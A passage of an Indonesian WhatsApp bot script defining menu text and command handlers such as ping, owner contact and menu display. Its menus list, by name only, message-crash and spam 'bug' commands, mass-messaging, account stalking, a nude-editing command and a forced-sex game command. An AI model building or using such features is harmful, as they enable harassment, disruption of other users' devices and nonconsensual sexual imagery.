┃ 𓋜 .bangke
┃ 𓋜 .sange
┃ 𓋜 .sangean
┃ 𓋜 .dakjal
┃ 𓋜 .horny
┃ 𓋜 .wibu
┃ 𓋜 .puki
┃ 𓋜 .puqi
┃ 𓋜 .peak
┃ 𓋜 .pantex
┃ 𓋜 .pantek
┃ 𓋜 .setan
┃ 𓋜 .iblis
┃ 𓋜 .cacat
┃ 𓋜 .yatim
┃ 𓋜 .piatu
╚━━━━━━━━━━━ ✇➣
`

const menuanime = `
╔── ✇➣ MENU - ANIME
┃ 𓋜 .akiyama
┃ 𓋜 .ana
┃ 𓋜 .art
┃ 𓋜 .asuna
┃ 𓋜 .ayuzawa
┃ 𓋜 .boruto
┃ 𓋜 .bts
┃ 𓋜 .cartoon
┃ 𓋜 .chiho
┃ 𓋜 .chitoge
┃ 𓋜 .cosplay
┃ 𓋜 .cosplayloli
┃ 𓋜 .cosplaysagiri
┃ 𓋜 .cyber
┃ 𓋜 .deidara
┃ 𓋜 .doraemon
┃ 𓋜 .elaina
┃ 𓋜 .emilia
┃ 𓋜 .erza
┃ 𓋜 .exo
┃ 𓋜 .gamewallpaper
┃ 𓋜 .gremory
┃ 𓋜 .hacker
┃ 𓋜 .hestia
┃ 𓋜 .hinata
┃ 𓋜 .husbu
┃ 𓋜 .inori
┃ 𓋜 .islamic
┃ 𓋜 .isuzu
┃ 𓋜 .itachi
┃ 𓋜 .itori
┃ 𓋜 .jennie
┃ 𓋜 .jiso
┃ 𓋜 .justina
┃ 𓋜 .kaga
┃ 𓋜 .kagura
┃ 𓋜 .kakasih
┃ 𓋜 .kaori
┃ 𓋜 .keneki
┃ 𓋜 .kotori
┃ 𓋜 .kurumi
┃ 𓋜 .lisa
┃ 𓋜 .madara
┃ 𓋜 .megumin
┃ 𓋜 .mikasa
┃ 𓋜 .mikey
┃ 𓋜 .miku
┃ 𓋜 .minato
┃ 𓋜 .mountain
┃ 𓋜 .naruto
┃ 𓋜 .neko2
┃ 𓋜 .nekonime
┃ 𓋜 .nezuko
┃ 𓋜 .onepiece
┃ 𓋜 .pentol
┃ 𓋜 .pokemon
┃ 𓋜 .programming
┃ 𓋜 .randomnime
┃ 𓋜 .randomnime2
┃ 𓋜 .rize
┃ 𓋜 .rose
┃ 𓋜 .sagiri
┃ 𓋜 .sakura
┃ 𓋜 .sasuke
┃ 𓋜 .satanic
┃ 𓋜 .shina
┃ 𓋜 .shinka
┃ 𓋜 .shinomiya
┃ 𓋜 .shizuka
┃ 𓋜 .shota
┃ 𓋜 .shortquote
┃ 𓋜 .space
┃ 𓋜 .technology
┃ 𓋜 .tejina
┃ 𓋜 .toukachan
┃ 𓋜 .tsunade
┃ 𓋜 .yotsuba
┃ 𓋜 .yuki
┃ 𓋜 .yulibocil
┃ 𓋜 .yumeko
╚━━━━━━━━━━━ ✇➣
`

const menugame = `
╔── ✇➣ MENU - GAME
┃ 𓋜 .tebakkta
┃ 𓋜 .tebakgambar
┃ 𓋜 .tebakbendera
┃ 𓋜 .tebakkimia
┃ 𓋜 .asahotak
┃ 𓋜 .susunkata
┃ 𓋜 .family100
╚━━━━━━━━━━━ ✇➣
`

const menuprimbon = `
╔── ✇➣ MENU - PRIMBON
┃ 𓋜 .artinama
┃ 𓋜 .artimimpi
┃ 𓋜 .ramaljodoh
┃ 𓋜 .ramaljodohbali
┃ 𓋜 .ramalcinta
┃ 𓋜 .cocoknama
┃ 𓋜 .pasangan
┃ 𓋜 .suamiistri
┃ 𓋜 .jadiannikah
┃ 𓋜 .sifatusaha
┃ 𓋜 .rezeki
┃ 𓋜 .pekerjaan
┃ 𓋜 .nasib
┃ 𓋜 .penyakit
┃ 𓋜 .tarot
┃ 𓋜 .fengshui
┃ 𓋜 .haribaik
┃ 𓋜 .harisangar
┃ 𓋜 .harisial
┃ 𓋜 .nagahari
┃ 𓋜 .arahrezeki
┃ 𓋜 .peruntungan
┃ 𓋜 .weton
┃ 𓋜 .karakter
┃ 𓋜 .keberuntungan
┃ 𓋜 .memancing
┃ 𓋜 .masabubur
┃ 𓋜 .zodiak
┃ 𓋜 .shio
╚━━━━━━━━━━━ ✇➣
`

const menumaker = `
╔── ✇➣ MENU - MAKER
┃ 𓋜 .animegirl
┃ 𓋜 .carbonify
┃ 𓋜 .fakecall
┃ 𓋜 .bratgenerator
┃ 𓋜 .pak-ustad
┃ 𓋜 .ngl
┃ 𓋜 .togura
┃ 𓋜 .fakeml
╚━━━━━━━━━━━ ✇➣
`

const menurpg = `
╔── ✇➣ MENU - RPG
┃ 𓋜 .adventure
┃ 𓋜 .beli
┃ 𓋜 .bank
┃ 𓋜 .shop
┃ 𓋜 .berburu
┃ 𓋜 .crafting
┃ 𓋜 .heal
┃ 𓋜 .nyampah
┃ 𓋜 .inventory
┃ 𓋜 .dailymisi
┃ 𓋜 .weekly
┃ 𓋜 .monthly
┃ 𓋜 .yearly
┃ 𓋜 .ngojek
┃ 𓋜 .polisi
┃ 𓋜 .roket
┃ 𓋜 .wikwik
┃ 𓋜 .ewe-paksa
┃ 𓋜 .open-bo
┃ 𓋜 .selectskill
┃ 𓋜 .cekskill
┃ 𓋜 .makan
┃ 𓋜 .tidur
┃ 𓋜 .mengaji
┃ 𓋜 .transfer
┃ 𓋜 .joinrpg
┃ 𓋜 .exitrpg
┃ 𓋜 .jual
┃ 𓋜 .kerja
┃ 𓋜 .redeem
┃ 𓋜 .memancing
┃ 𓋜 .merampok
┃ 𓋜 .mining
┃ 𓋜 .nebang
┃ 𓋜 .repair
┃ 𓋜 .atmall
┃ 𓋜 .dompet
┃ 𓋜 .werewolf
╚━━━━━━━━━━━ ✇➣
`

const menueditimg = `
╔── ✇➣ MENU - EDITIMG
┃ 𓋜 .putihkan
┃ 𓋜 .hitamkan
┃ 𓋜 .edit
┃ 𓋜 .tobersama
┃ 𓋜 .toblonde
┃ 𓋜 .tobotak
┃ 𓋜 .tohijab
┃ 𓋜 .tomekah
┃ 𓋜 .tomirror
┃ 𓋜 .tovintage
┃ 𓋜 .toanime
┃ 𓋜 .tofigura
┃ 𓋜 .tovigurav2
┃ 𓋜 .tofigurav3
┃ 𓋜 .tobabi
┃ 𓋜 .tobrewok
┃ 𓋜 .tochibi
┃ 𓋜 .todpr
┃ 𓋜 .toghibli
┃ 𓋜 .tojepang
┃ 𓋜 .tokacamata
┃ 𓋜 .tolego
┃ 𓋜 .tomaya
┃ 𓋜 .tomoai
┃ 𓋜 .toreal
┃ 𓋜 .tosdmtinggi
┃ 𓋜 .tosatan
┃ 𓋜 .tosad
┃ 𓋜 .tosexy
┃ 𓋜 .tobugil
╚━━━━━━━━━━━ ✇➣
`
const menuephoto = `
╔── ✇➣ MENU - EPHOTO
┃ 𓋜 .glitchtext
┃ 𓋜 .writetext
┃ 𓋜 .advancedglow
┃ 𓋜 .typographytext
┃ 𓋜 .pixelglitch
┃ 𓋜 .neonglitch
┃ 𓋜 .flagtext
┃ 𓋜 .flag3dtext
┃ 𓋜 .deletingtext
┃ 𓋜 .blackpinkstyle
┃ 𓋜 .glowingtext
┃ 𓋜 .underwatertext
┃ 𓋜 .logomaker
┃ 𓋜 .cartoonstyle
┃ 𓋜 .papercutstyle
┃ 𓋜 .watercolortext
┃ 𓋜 .effectclouds
┃ 𓋜 .blackpinklogo
┃ 𓋜 .gradienttext
┃ 𓋜 .summerbeach
┃ 𓋜 .luxurygold
┃ 𓋜 .multicoloyellowneon
┃ 𓋜 .sandsummer
┃ 𓋜 .galaxywallpaper
┃ 𓋜 .1917style
┃ 𓋜 .makingneon
┃ 𓋜 .royaltext
┃ 𓋜 .freecreate
┃ 𓋜 .galaxystyle
┃ 𓋜 .lighteffects
╚━━━━━━━━━━━ ✇➣
`

const menustore = `
╔── ✇➣ MENU - STORE
┃ 𓋜 .jpm
┃ 𓋜 .pushkontak
┃ 𓋜 .savekontak
┃ 𓋜 .done
┃ 𓋜 .proses
┃ 𓋜 .payment
┃ 𓋜 .addproduk
┃ 𓋜 .delproduk
┃ 𓋜 .listproduk
┃ 𓋜 .beliproduk
┃ 𓋜 .restok
┃ 𓋜 .confirm
┃ 𓋜 .cancel
┃ 𓋜 .jpmch
┃ 𓋜 .addidch
╚━━━━━━━━━━━ ✇➣
`
const menuquotes = `
╔── ✇➣ MENU - QUOTES
┃ 𓋜 .faktaunik
┃ 𓋜 .katailham
┃ 𓋜 .katasenja
┃ 𓋜 .motivasi
┃ 𓋜 .pantun
┃ 𓋜 .puisi
┃ 𓋜 .quotes
┃ 𓋜 .quotesanime
┃ 𓋜 .quotesbucin
┃ 𓋜 .quotesdilan
┃ 𓋜 .quotesislamic
╚━━━━━━━━━━━ ✇➣
`
const menuconfess = `
╔── ✇➣ MENU - MENFESS
┃ 𓋜 .menfess
┃ 𓋜 .confess
╚━━━━━━━━━━━ ✇➣
`
const menurandom = `
╔── ✇➣ MENU - RANDOM
┃ 𓋜 .bluearchiver
┃ 𓋜 .china
┃ 𓋜 .indo
┃ 𓋜 .waifu
┃ 𓋜 .neko
┃ 𓋜 .vietnam
┃ 𓋜 .thailand
┃ 𓋜 .korea
┃ 𓋜 .japan
╚━━━━━━━━━━━ ✇➣
`
const menuberita = `
╔── ✇➣ MENU - BERITA
┃ 𓋜 .antara
┃ 𓋜 .cnbc
┃ 𓋜 .cnn
┃ 𓋜 .kompas
┃ 𓋜 .merdeka
┃ 𓋜 .sindonews
┃ 𓋜 .suara
╚━━━━━━━━━━━ ✇➣
`
const menuppob = `
╔── ✇➣ MENU - PPOB
┃ 𓋜 .deposit
┃ 𓋜 .bank
┃ 𓋜 .saldo
┃ 𓋜 .mutasi
┃ 𓋜 .buypanel
┃ 𓋜 .order
╚━━━━━━━━━━━ ✇➣
`
const menulinode = `
╔── ✇➣ MENU - LINODE
┃ 𓋜 .linode2gb
┃ 𓋜 .linode4gb
┃ 𓋜 .linode8gb
┃ 𓋜 .linode16gb
┃ 𓋜 .listlinode
┃ 𓋜 .onlinode
┃ 𓋜 .offlinode
┃ 𓋜 .rebootlinode
┃ 𓋜 .rebuildlinode
┃ 𓋜 .delinode
┃ 𓋜 .saldolinode
┃ 𓋜 .sisalinode
┃ 𓋜 .cekvpslinode
╚━━━━━━━━━━━ ✇➣
`
const menunsfw = `
╔── ✇➣ MENU - NSFW
┃ 𓋜 .waifu
┃ 𓋜 .neko
┃ 𓋜 .shinobu
┃ 𓋜 .megumin
┃ 𓋜 .bully
┃ 𓋜 .cuddle
┃ 𓋜 .cry
┃ 𓋜 .hug
┃ 𓋜 .awoo
┃ 𓋜 .kiss
┃ 𓋜 .lick
┃ 𓋜 .pat
┃ 𓋜 .smug
┃ 𓋜 .bonk
┃ 𓋜 .yeet
┃ 𓋜 .blush
┃ 𓋜 .smile
┃ 𓋜 .wave
┃ 𓋜 .highfive
┃ 𓋜 .handhold
┃ 𓋜 .nom
┃ 𓋜 .bite
┃ 𓋜 .glomp
┃ 𓋜 .slap
┃ 𓋜 .kill
┃ 𓋜 .happy
┃ 𓋜 .wink
┃ 𓋜 .poke
┃ 𓋜 .dance
┃ 𓋜 .cringe
┃ 𓋜 .trap
┃ 𓋜 .blowjob
┃ 𓋜 .hentai
┃ 𓋜 .boobs
┃ 𓋜 .ass
┃ 𓋜 .pussy
┃ 𓋜 .thighs
┃ 𓋜 .lesbian
┃ 𓋜 .lewdneko
┃ 𓋜 .cum
╚━━━━━━━━━━━ ✇➣
`
const menugenshin = `
╔── ✇➣ MENU - GENSHIN
┃ 𓋜 .build_gi
┃ 𓋜 .gens-wildlife
┃ 𓋜 .gens-weapons
┃ 𓋜 .gens-voiceovers
┃ 𓋜 .gens-viewpoint
┃ 𓋜 .gens-talents
┃ 𓋜 .gens-potion
┃ 𓋜 .gens-outfit
┃ 𓋜 .gens-nation
┃ 𓋜 .gens-namacard
┃ 𓋜 .gens-materials
┃ 𓋜 .gens-food
┃ 𓋜 .gens-enemy
┃ 𓋜 .gens-emoji
┃ 𓋜 .gens-domain
┃ 𓋜 .gens-craft
┃ 𓋜 .gens-constellation
┃ 𓋜 .gens-artifact
┃ 𓋜 .gens-area
┃ 𓋜 .gens-animals
┃ 𓋜 .gens-advrank
┃ 𓋜 .gens-achievement
┃ 𓋜 .gens-characters
╚━━━━━━━━━━━ ✇➣
`
const menuenc = `
╔── ✇➣ MENU - ENCRYPT
┃ 𓋜 .enccustome
┃ 𓋜 .encarab
┃ 𓋜 .encchina
┃ 𓋜 .encinvis
┃ 𓋜 .encsiu
┃ 𓋜 .encstrong
┃ 𓋜 .encultra
╚━━━━━━━━━━━ ✇➣
`
const menudigitalocean = `
╔── ✇➣ MENU - DIGITAL OCEAN
┃ 𓋜 .vps1g1c
┃ 𓋜 .vps2g1c
┃ 𓋜 .vps4g2c
┃ 𓋜 .vps8g4c
┃ 𓋜 .vps16g4c
┃ 𓋜 .listdroplet
┃ 𓋜 .deldroplet
┃ 𓋜 .sisadroplet
┃ 𓋜 .cekdroplet
┃ 𓋜 .turnon
┃ 𓋜 .turnoff
┃ 𓋜 .restartvps
╚━━━━━━━━━━━ ✇➣
`
const menuislam = `
╔── ✇➣ MENU - ISLAM
┃ 𓋜 .jadwalsholat
┃ 𓋜 .alquran
┃ 𓋜 .asmaulhusna
┃ 𓋜 .niatsholat
┃ 𓋜 .surah
┃ 𓋜 .berdoa
┃ 𓋜 .ayatkursi
┃ 𓋜 .gislam
┃ 𓋜 .kataislam
┃ 𓋜 .pantunislam
╚━━━━━━━━━━━ ✇➣
`
const menusearch = `
╔── ✇➣ MENU - SEARCH
┃ 𓋜 .playstore
┃ 𓋜 .playstation
┃ 𓋜 .google
┃ 𓋜 .chrome
┃ 𓋜 .gimage
┃ 𓋜 .bingsearch
┃ 𓋜 .bingimage
┃ 𓋜 .bingvideo
╚━━━━━━━━━━━ ✇➣
`
const menubug = `
╔── ✇➣ MENU - BUG
┃ 𓋜 .🌷
┃ 𓋜 .🐲
┃ 𓋜 .🐉
┃ 𓋜 .🌵
┃ 𓋜 .🎄
┃ 𓋜 .🌲
┃ 𓋜 .🌳
┃ 𓋜 .🌱
┃ 𓋜 .🌿
┃ 𓋜 .🍀
┃ 𓋜 .☘️
┃ 𓋜 .bugs
┃ 𓋜 .buglink
┃ 𓋜 .spams
┃ 𓋜 .santetgc2
┃ 𓋜 .santetgc
┃ 𓋜 .xvir
┃ 𓋜 .xstik
┃ 𓋜 .xlist
┃ 𓋜 .xbutton
┃ 𓋜 .x24j
┃ 𓋜 .xuia
┃ 𓋜 .xlec
┃ 𓋜 .xforce
┃ 𓋜 .xva
┃ 𓋜 .xta
┃ 𓋜 .xcrash
┃ 𓋜 .xbom
┃ 𓋜 .xbug
┃ 𓋜 .xkill
┃ 𓋜 .xloc
┃ 𓋜 .xdoc
┃ 𓋜 .xhit
╚━━━━━━━━━━━ ✇➣
  `
  const menustalk = `
╔── ✇➣ MENU - STALK
┃ 𓋜 .stalkig
┃ 𓋜 .stalktoblox
┃ 𓋜 .stalktwiter
┃ 𓋜 .stalkyt
╚━━━━━━━━━━━ ✇➣
`
const menuinstall = `
╔── ✇➣ MENU - INSTALL
┃ 𓋜 .installpanel
┃ 𓋜 .installtemabilling
┃ 𓋜 .installtemaenigma
┃ 𓋜 .installtemastellar
┃ 𓋜 .uinstallpanel
┃ 𓋜 .uinstalltema
╚━━━━━━━━━━━ ✇➣
`
// LIST
const menu = `
╔── ✇➣ LIST - MENU
┃ 𓋜 .allmenu
┃ 𓋜 .menuowner
┃ 𓋜 .menuother
┃ 𓋜 .menuai
┃ 𓋜 .menudownload
┃ 𓋜 .menuconvert
┃ 𓋜 .menucpanel
┃ 𓋜 .menucpanel2
┃ 𓋜 .menufun
┃ 𓋜 .menuanime
┃ 𓋜 .menugame
┃ 𓋜 .menuprimbon
┃ 𓋜 .menumaker
┃ 𓋜 .menurpg
┃ 𓋜 .menueditimg
┃ 𓋜 .menuephoto
┃ 𓋜 .menustore
┃ 𓋜 .menuquotes
┃ 𓋜 .menumenfess
┃ 𓋜 .menurandom
┃ 𓋜 .menuberita
┃ 𓋜 .menulinode
┃ 𓋜 .menunsfw
┃ 𓋜 .menugenshin
┃ 𓋜 .menuenc
┃ 𓋜 .menudigitalocean
┃ 𓋜 .menuislam
┃ 𓋜 .menusearch
┃ 𓋜 .menubug
┃ 𓋜 .menustalk
┃ 𓋜 .menuinstall
╚━━━━━━━━━━━ ✇➣
`

const allmenu = `
${menuowner}
${menugroup}
${menuother}
${menuai}
${menudownload}
${menuconvert}
${menucpanel}
${menucpanel2}
${menufun}
${menuanime}
${menugame}
${menuprimbon}
${menumaker}
${menurpg}
${menueditimg}
${menuephoto}
${menustore}
${menuquotes}
${menuconfess}
${menurandom}
${menuberita}
${menulinode}
${menunsfw}
${menugenshin}
${menuenc}
${menudigitalocean}
${menuislam}
${menusearch}
${menubug}
${menustalk}
${menuinstall}
`
//============= [ COMMANDS ] ====================================================
        switch (command) {
        case "sc": case "script": {
        const nomorbot = (await sock.decodeJid(sock.user.id)).replace(/@.*/, "");
        const tks = `
 Link download di https://whatsapp.com/channel/0029VaBOlsv002TEjlntTE2D
        
 Keuntungan : 
╔── ✇➣ LIST - MENU
┃ 𓋜 .allmenu
┃ 𓋜 .menuowner
┃ 𓋜 .menuother
┃ 𓋜 .menuai
┃ 𓋜 .menudownload
┃ 𓋜 .menuconvert
┃ 𓋜 .menucpanel
┃ 𓋜 .menucpanel2
┃ 𓋜 .menufun
┃ 𓋜 .menuanime
┃ 𓋜 .menugame
┃ 𓋜 .menuprimbon
┃ 𓋜 .menumaker
┃ 𓋜 .menurpg
┃ 𓋜 .menueditimg
┃ 𓋜 .menuephoto
┃ 𓋜 .menustore
┃ 𓋜 .menuquotes
┃ 𓋜 .menumenfess
┃ 𓋜 .menurandom
┃ 𓋜 .menuberita
┃ 𓋜 .menulinode
┃ 𓋜 .menunsfw
┃ 𓋜 .menugenshin
┃ 𓋜 .menuenc
┃ 𓋜 .menudigitalocean
┃ 𓋜 .menuislam
┃ 𓋜 .menusearch
┃ 𓋜 .menubug
┃ 𓋜 .menustalk
┃ 𓋜 .menuinstall
╚━━━━━━━━━━━ ✇➣`
        sock.sendMessage(m.chat, {text: tks, mentions: [m.sender], 
contextInfo:{
mentionedJid:[m.sender],
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: null,
newsletterName: ``,
serverId: 200
}, 
externalAdReply: {
title: name, 
thumbnailUrl: thumbnail2, 
renderLargerThumbnail: false, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "", 
}}
}, {quoted: null })
}
break
        case 'speed': case 'ping': {
				try {
					const used = process.memoryUsage();
					const cpus = os.cpus().map(cpu => {
						cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);
						return cpu;
					});
					const cpu = cpus.reduce((last, cpu, _, { length }) => {
						last.total += cpu.total;
						last.speed += cpu.speed / length;
						last.times.user += cpu.times.user;
						last.times.nice += cpu.times.nice;
						last.times.sys += cpu.times.sys;
						last.times.idle += cpu.times.idle;
						last.times.irq += cpu.times.irq;
						return last;
					}, {
						speed: 0,
						total: 0,
						times: { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 }
					});
					let start = performance.now();
					let end = performance.now();
					let latensi = end - start;
					let osInfo = await nou.os.oos();
					let storage = await nou.drive.info();
					let respon = `✨ *Informasi Bot WhatsApp* ✨\n\n📡 *Jaringan Server*\n · *Ping:* ${latensi.toFixed(4)} Detik\n\n🖥️ *Informasi Server*\n · *OS:* ${osInfo}\n · *IP Address:* ${nou.os.ip()}\n · *Tipe OS:* ${nou.os.type()}\n\n💾 *RAM:*\n · *Total:* ${formatp(os.totalmem())}\n · *Digunakan:* ${formatp(os.totalmem() - os.freemem())}\n\n📂 *Penyimpanan:*\n · *Total:* ${storage.totalGb} GB\n · *Digunakan:* ${storage.usedGb} GB (${storage.usedPercentage}%)\n · *Tersedia:* ${storage.freeGb} GB (${storage.freePercentage}%)\n\n⏳ *Waktu Aktif Server:*\n${runtime(process.uptime())}\n\n⚙️ *CPU (${cpus.length} Core)*\n · *Model:* ${cpus[0].model.trim()}\n · *Kecepatan:* ${cpu.speed} MHz\n${Object.keys(cpu.times).map(type => ` · *${type}*: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}\n`;
					await sock.sendMessage(m.chat, {
						text: respon,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 999999, 
							isForwarded: false, 
							forwardedNewsletterMessageInfo: {
								newsletterName: name,
								newsletterJid: null,
							},
							externalAdReply: {
								title: "© "+namaBot,
								thumbnailUrl: thumbnail2,
			
								sourceUrl: "https://wa.me/c/6283191939584",
								mediaType: 9999999988888,
								renderLargerThumbnail: false
							}
						}
					}, { quoted: fakeQuoted });
				} catch (err) {
					console.error(err);
				}
			}
			break;
			case "ttf":
			case "totalfitur": {


  // Folder case & plugin
  const caseDir = './Marin';
  const pluginDir = './Plugins';

  // Hitung jumlah file di folder case
  let totalCase = totalfitur;
  if (fs.existsSync(caseDir)) {
    totalCase = fs.readdirSync(caseDir).filter(f => f.endsWith('.js')).length;
  }

  // Hitung jumlah file di folder plugins
  let totalPlugin = 0;
  if (fs.existsSync(pluginDir)) {
    totalPlugin = fs.readdirSync(pluginDir).filter(f => f.endsWith('.js')).length;
  }

  // Total fitur gabungan
  let totalFitur = totalCase + totalPlugin;

  let text = `
📦 *TOTAL FITUR BOT*

🧩 Total Case   : *${totalCase}*
🔌 Total Plugin : *${totalPlugin}*
✨ Total Fitur   : *${totalFitur}*
  `;

  m.reply(text);
}
break;
			case "developerbot": case "owner": case "own": case "dev": {
await sock.sendContact(m.chat, [global.owner], null)
sock.sendMessage(m.chat, {text:`Hai @${m.sender.split("@")[0]} ini adalah owner aku`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
break
case "q": {

if (!isOwner) return reply(mess.owner)
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break 
// MENU
case "menu": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        console.log('Menu version:', menuVersion);

        if (menuVersion === 'v1') menuV1(menu);
        else if (menuVersion === 'v2') menuV2(menu);
        else if (menuVersion === 'v3') menuV3(menu);
        else menuV1(menu);

    } catch (error) {
        console.error('Error in menu case:', error);
        menuV1(menu);
    }
    await sleep(1500)
    lagu()
    break;
}

case "allmenu": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        console.log('Allmenu version:', menuVersion);

        if (menuVersion === 'v1') menuV1(allmenu);
        else if (menuVersion === 'v2') menuV2(allmenu);
        else if (menuVersion === 'v3') menuV3(allmenu);
        else menuV1(allmenu);

    } catch (error) {
        console.error('Error in allmenu case:', error);
        menuV1(allmenu);
    }
    break;
}

case "menuowner": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menuowner);
        else if (menuVersion === 'v2') menuV2(menuowner);
        else if (menuVersion === 'v3') menuV3(menuowner);
        else menuV1(menuowner);

    } catch (error) {
        console.error('Error in menuowner case:', error);
        menuV1(menuowner);
    }
    break;
}

case "menugroup": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menugroup);
        else if (menuVersion === 'v2') menuV2(menugroup);
        else if (menuVersion === 'v3') menuV3(menugroup);
        else menuV1(menugroup);

    } catch (error) {
        console.error('Error in menugroup case:', error);
        menuV1(menugroup);
    }
    break;
}

case "menuother": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menuother);
        else if (menuVersion === 'v2') menuV2(menuother);
        else if (menuVersion === 'v3') menuV3(menuother);
        else menuV1(menuother);

    } catch (error) {
        console.error('Error in menuother case:', error);
        menuV1(menuother);
    }
    break;
}

case "menuai": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menuai);
        else if (menuVersion === 'v2') menuV2(menuai);
        else if (menuVersion === 'v3') menuV3(menuai);
        else menuV1(menuai);

    } catch (error) {
        console.error('Error in menuai case:', error);
        menuV1(menuai);
    }
    break;
}

case "menudownload": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menudownload);
        else if (menuVersion === 'v2') menuV2(menudownload);
        else if (menuVersion === 'v3') menuV3(menudownload);
        else menuV1(menudownload);

    } catch (error) {
        console.error('Error in menudownload case:', error);
        menuV1(menudownload);
    }
    break;
}

case "menuconvert": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menuconvert);
        else if (menuVersion === 'v2') menuV2(menuconvert);
        else if (menuVersion === 'v3') menuV3(menuconvert);
        else menuV1(menuconvert);

    } catch (error) {
        console.error('Error in menuconvert case:', error);
        menuV1(menuconvert);
    }
    break;
}

case "menucpanel": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menucpanel);
        else if (menuVersion === 'v2') menuV2(menucpanel);
        else if (menuVersion === 'v3') menuV3(menucpanel);
        else menuV1(menucpanel);

    } catch (error) {
        console.error('Error in menucpanel case:', error);
        menuV1(menucpanel);
    }
    break;
}

case "menucpanel2": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menucpanel2);
        else if (menuVersion === 'v2') menuV2(menucpanel2);
        else if (menuVersion === 'v3') menuV3(menucpanel2);
        else menuV1(menucpanel2);

    } catch (error) {
        console.error('Error in menucpanel2 case:', error);
        menuV1(menucpanel2);
    }
    break;
}

case "menufun": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menufun);
        else if (menuVersion === 'v2') menuV2(menufun);
        else if (menuVersion === 'v3') menuV3(menufun);
        else menuV1(menufun);

    } catch (error) {
        console.error('Error in menufun case:', error);
        menuV1(menufun);
    }
    break;
}

case "menuanime": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menuanime);
        else if (menuVersion === 'v2') menuV2(menuanime);
        else if (menuVersion === 'v3') menuV3(menuanime);
        else menuV1(menuanime);

    } catch (error) {
        console.error('Error in menuanime case:', error);
        menuV1(menuanime);
    }
    break;
}

case "menugame": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menugame);
        else if (menuVersion === 'v2') menuV2(menugame);
        else if (menuVersion === 'v3') menuV3(menugame);
        else menuV1(menugame);

    } catch (error) {
        console.error('Error in menugame case:', error);
        menuV1(menugame);
    }
    break;
}

case "menuprimbon": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menuprimbon);
        else if (menuVersion === 'v2') menuV2(menuprimbon);
        else if (menuVersion === 'v3') menuV3(menuprimbon);
        else menuV1(menuprimbon);

    } catch (error) {
        console.error('Error in menuprimbon case:', error);
        menuV1(menuprimbon);
    }
    break;
}

case "menumaker": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menumaker);
        else if (menuVersion === 'v2') menuV2(menumaker);
        else if (menuVersion === 'v3') menuV3(menumaker);
        else menuV1(menumaker);

    } catch (error) {
        console.error('Error in menumaker case:', error);
        menuV1(menumaker);
    }
    break;
}

case "menurpg": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menurpg);
        else if (menuVersion === 'v2') menuV2(menurpg);
        else if (menuVersion === 'v3') menuV3(menurpg);
        else menuV1(menurpg);

    } catch (error) {
        console.error('Error in menurpg case:', error);
        menuV1(menurpg);
    }
    break;
}

case "menueditimg": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menueditimg);
        else if (menuVersion === 'v2') menuV2(menueditimg);
        else if (menuVersion === 'v3') menuV3(menueditimg);
        else menuV1(menueditimg);

    } catch (error) {
        console.error('Error in menueditimg case:', error);
        menuV1(menueditimg);
    }
    break;
}

case "menuephoto": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menuephoto);
        else if (menuVersion === 'v2') menuV2(menuephoto);
        else if (menuVersion === 'v3') menuV3(menuephoto);
        else menuV1(menuephoto);

    } catch (error) {
        console.error('Error in menuephoto case:', error);
        menuV1(menuephoto);
    }
    break;
}

case "menustore": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menustore);
        else if (menuVersion === 'v2') menuV2(menustore);
        else if (menuVersion === 'v3') menuV3(menustore);
        else menuV1(menustore);

    } catch (error) {
        console.error('Error in menustore case:', error);
        menuV1(menustore);
    }
    break;
}

case "menuquotes": {
    try {
        const setmenu = loadSetMenu();
        const menuVersion = setmenu.menuVersion || 'v1';

        if (menuVersion === 'v1') menuV1(menuquotes);
        else if (menuVersion === 'v2') menuV2(menuquotes);
        else if (menuVersion === 'v3') menuV3(menuquotes);
        else menuV1(menuquotes);

    } catch (error) {
        console.error('Error in menuquotes case:', error);
        menuV1(menuquotes);
    }
    break;
}

